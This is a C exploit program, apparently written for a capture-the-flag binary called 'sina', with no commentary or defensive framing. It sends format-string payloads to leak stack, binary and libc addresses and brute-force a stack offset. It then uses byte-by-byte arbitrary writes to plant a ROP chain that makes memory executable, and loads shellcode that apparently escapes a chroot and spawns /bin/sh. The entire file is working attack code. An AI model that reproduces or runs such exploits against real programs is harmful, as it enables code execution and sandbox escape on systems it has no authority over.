#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>

char buff[0x100000];
char payload[0x48];

void arb_write(int in_fd, int out_fd, uint64_t addr, uint8_t value) {
    uint64_t addr_tmp = addr;
    for (int i = 0; i < 8; i++) {
        snprintf(payload, 0x40, "%%%dc%%%d$hhn%%%dc%%%d$hhn\0", 0x70, 75, 0xd0 + i - 0x70, 62);
        write(in_fd, payload, 0x40);
        usleep(10000);
        read(out_fd, buff, 0xd0 + i);

        int addr_byte = (addr_tmp - 0x70) & 0xff;
        if (addr_byte == 0) {
            snprintf(payload, 0x40, "%%%dc%%%d$hhn%%%d$hhn\0", 0x70, 75, 77);
        } else {
            snprintf(payload, 0x40, "%%%dc%%%d$hhn%%%dc%%%d$hhn\0", 0x70, 75, addr_byte, 77);
        }
        write(in_fd, payload, 0x40);
        usleep(10000);
        read(out_fd, buff, 0x70 + addr_byte);
        addr_tmp >>= 8;
    }
    int value_byte = (value - 0x70) & 0xff;
    if (value_byte == 0) {
        snprintf(payload, 0x40, "%%%dc%%%d$hhn%%%d$hhn\0", 0x70, 75, 58);
    } else {
        snprintf(payload, 0x40, "%%%dc%%%d$hhn%%%dc%%%d$hhn\0", 0x70, 75, value_byte, 58);
    }
    write(in_fd, payload, 0x40);
    usleep(10000);
    read(out_fd, buff, 0x70 + value_byte);
}

int main(int argc, char **argv, char **envp) {

    printf("[-] Guess stack offset. This may take a while ...\n");

    while (1) {
        int in_fd[2];
        int out_fd[2];

        pipe(in_fd);
        pipe(out_fd);

        pid_t pid = fork();
        if (pid < 0) {
            perror("fork error");
            exit(1);
        }
        if (pid == 0) {
            // In child
            int stdin_fileno_dup = dup(STDIN_FILENO);
            int stdout_fileno_dup = dup(STDOUT_FILENO);
            int stderr_fileno_dup = dup(STDERR_FILENO);
            dup2(in_fd[0], STDIN_FILENO);
            dup2(out_fd[1], STDOUT_FILENO);
            dup2(out_fd[1], STDERR_FILENO);

            close(in_fd[1]);
            close(out_fd[0]);

            char *sina_argv[] = { "sina", NULL };
            char *sina_envp[] = { "A", NULL };
            execve("sina", sina_argv, sina_envp);

        }
        // In parent
        
        close(in_fd[0]);
        close(out_fd[1]);

        snprintf(payload, 0x40, "%%%dc%%%d$hhn%%%d$p%%%d$p%%%d$p%%%dc%%%d$hn", 0x8, 32, 13, 11, 9, 0xec28 - 0x8 - 14 * 3, 13);
        write(in_fd[1], payload, 0x40);
        read(out_fd[0], buff, 8);

        read(out_fd[0], buff, 14);
        uint64_t stack_addr = strtoul(buff, NULL, 0) - 0x228;

        read(out_fd[0], buff, 14);
        uint64_t elf_base = strtoul(buff, NULL, 0) - 0x1159;

        read(out_fd[0], buff, 14);
        uint64_t libc_base = strtoul(buff, NULL, 0) - 0x2d57d;

        if ((stack_addr & 0xffff) != 0xec30) {
            kill(pid, SIGKILL);
            close(in_fd[1]);
            close(out_fd[0]);
            continue;
        }

        printf("[*] stack addr = %p\n", stack_addr);
        printf("[*] elf base = %p\n", elf_base);
        printf("[*] libc base = %p\n", libc_base);

        uint64_t rwx_region = elf_base + 0x4000;
        uint64_t fake_stack = rwx_region + 0x100;
        uint64_t shellcode_addr = rwx_region + 0x200;

        snprintf(payload, 0x40, "%%%dc%%%d$hhn%%%dc%%%d$hn\0", 0x70, 75, 0xedd0 - 0x70, 62);
        write(in_fd[1], payload, 0x40);
        usleep(10000);
        read(out_fd[0], buff, 0x100000);

        printf("[*] Writing ROP...\n");

        uint64_t pop_rdi_ret = libc_base + 0x2dad2;
        uint64_t pop_rsi_ret = libc_base + 0x2f2c1;
        uint64_t pop_rax_ret = libc_base + 0x44af0;
        uint64_t pop_rdx_ret = libc_base + 0x1002c2;
        uint64_t syscall_ret = libc_base + 0x88546;
        uint64_t jmp_rax = libc_base + 0x2d887;
        uint64_t leave_ret = elf_base + 0x11b6;

        uint64_t rop_u64[0x100];
        uint8_t *rop = (uint8_t *)rop_u64;
        int rop_top = 0;
        rop_u64[rop_top++] = pop_rdi_ret;
        rop_u64[rop_top++] = rwx_region;
        rop_u64[rop_top++] = pop_rsi_ret;
        rop_u64[rop_top++] = 0x1000;
        rop_u64[rop_top++] = pop_rdx_ret;
        rop_u64[rop_top++] = 0x7;
        rop_u64[rop_top++] = pop_rax_ret;
        rop_u64[rop_top++] = 0xa;
        rop_u64[rop_top++] = syscall_ret;
        rop_u64[rop_top++] = pop_rax_ret;
        rop_u64[rop_top++] = shellcode_addr;
        rop_u64[rop_top++] = jmp_rax;

        for (int i = 0; i < rop_top * 8; i++) {
            arb_write(in_fd[1], out_fd[0], fake_stack + 8 + i, rop[i]);
        }

        uint64_t rop2_u64[0x100];
        uint8_t *rop2 = (uint8_t *)rop2_u64;
        int rop2_top = 0;
        rop2_u64[rop2_top++] = fake_stack;
        rop2_u64[rop2_top++] = leave_ret;

        for (int i = 0; i < rop2_top * 8; i++) {
            arb_write(in_fd[1], out_fd[0], stack_addr + i, rop2[i]);
        }

        printf("[*] Writing Shellcode...\n");

        uint8_t shellcode[] = {
            0x6a, 0x41, 0x48, 0x89, 0xe7, 0x48, 0xc7, 0xc6, 0xff, 0xff, 0xff, 0xff,
            0x48, 0x81, 0xf6, 0x12, 0xfe, 0xff, 0xff, 0x6a, 0x53, 0x58, 0x0f, 0x05,
            0x6a, 0x41, 0x48, 0x89, 0xe7, 0x31, 0xc0, 0x04, 0xa1, 0x0f, 0x05, 0x6a,
            0x10, 0x41, 0x58, 0x31, 0xdb, 0x66, 0x81, 0xc3, 0x2e, 0x2e, 0x53, 0x48,
            0x89, 0xe7, 0x6a, 0x50, 0x58, 0x0f, 0x05, 0x49, 0xff, 0xc8, 0x4d, 0x85,
            0xc0, 0x75, 0xe8, 0x6a, 0x2e, 0x48, 0x89, 0xe7, 0x31, 0xc0, 0x04, 0xa1,
            0x0f, 0x05, 0x6a, 0x07, 0x5f, 0x31, 0xf6, 0x6a, 0x21, 0x58, 0x0f, 0x05,
            0x6a, 0x08, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x6a,
            0x09, 0x5f, 0x6a, 0x02, 0x5e, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x31, 0xd2,
            0x52, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53,
            0x54, 0x5f, 0x48, 0xc7, 0xc3, 0xd2, 0x96, 0xff, 0xff, 0x48, 0x83, 0xf3,
            0xff, 0x53, 0x54, 0x5b, 0x52, 0x53, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58,
            0x0f, 0x05
        };
        unsigned int shellcode_len = 146;
        for (int i = 0; i < shellcode_len; i++) {
            arb_write(in_fd[1], out_fd[0], shellcode_addr + i, shellcode[i]);
        }

        snprintf(payload, 0x40, "%%%dc%%%d$hhn\0", 0x70, 75);
        write(in_fd[1], payload, 0x40);
        usleep(10000);

        printf("[*] Triggering Shellcode...\n");
        snprintf(payload, 0x40, "%%%dc%%%d$hhn\0", 0x34, 75);
        write(in_fd[1], payload, 0x40);

        int status;
        waitpid(pid, &status, 0);

        if (WIFEXITED(status)) {
            printf("program exited\n");
        }
        if (WIFSIGNALED(status)) {
            printf("program signaled, signal number = %d\n", WTERMSIG(status));
        }
        break;
    }
    return 0;
}
